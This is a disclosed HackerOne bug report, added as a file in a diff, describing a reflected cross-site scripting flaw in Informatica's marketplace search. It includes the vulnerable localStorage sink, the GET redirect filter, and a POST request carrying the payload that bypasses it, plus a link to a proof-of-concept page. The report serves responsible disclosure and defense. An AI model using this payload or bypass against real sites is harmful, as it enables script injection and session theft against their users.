@@ -1,0 +1,43 @@
+ReportLink:https://hackerone.com/reports/200034
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/s_p_q_r
+ReportedTo:Informatica(informatica)
+BountyAmount:
+Severity:high
+State:Closed
+DateOfDisclosure:22.05.2017 4:08:23
+
+Summary:
+
+The search query parameter is put into Javascript to set the localStorage item:
+
+https://marketplace.informatica.com/search-solr.jspa?q=%foo%
+
+```javascript
+localStorage.setItem("searchTerm", "%foo%");
+```
+
+Attempts to inject XSS payloads are blocked by redirection that removes special chars from the URL:
+
+```http
+GET /search-solr.jspa?q=aaa%22bbb%27ccc%3Cddd%3Eeee HTTP/1.1
+Host: marketplace.informatica.com
+
+HTTP/1.0 302 Found
+Location: https://marketplace.informatica.com/search-solr.jspa?q=aaabbbcccdddeee
+```
+
+However it turns out the search param can be successfully submitted via POST — the following request popups an alert:
+
+```http
+POST /search-solr.jspa HTTP/1.1
+Host: marketplace.informatica.com
+
+q=%22-alert%28document.domain%29-%22
+```
+
+**PoC:**
+
+http://spqr.zz.mu/info_mp.php?key=066c1cac-b380-4455-9d36-4086dd999dd9
+
+Tested with latest Firefox and Chrome.
